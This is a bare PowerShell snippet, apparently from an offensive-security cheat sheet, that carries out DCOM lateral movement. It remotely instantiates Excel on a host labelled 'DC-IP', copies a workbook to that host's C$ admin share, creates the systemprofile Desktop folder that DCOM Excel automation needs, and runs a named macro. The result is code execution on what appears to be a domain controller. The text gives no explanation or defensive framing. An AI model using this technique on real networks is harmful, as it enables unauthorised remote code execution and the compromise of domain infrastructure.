$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application","DC-IP"))
$LocalPath = "C:\Users\USER\Desktop\excel-file-name.xls"
$RemotePath = "\\DC-IP\c$\excel-file-name.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
$Path = "\\DC-IP\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)
$Workbook = $com.Workbooks.Open("C:\excel-file-name.xls")
$com.Run("Macro-Name")
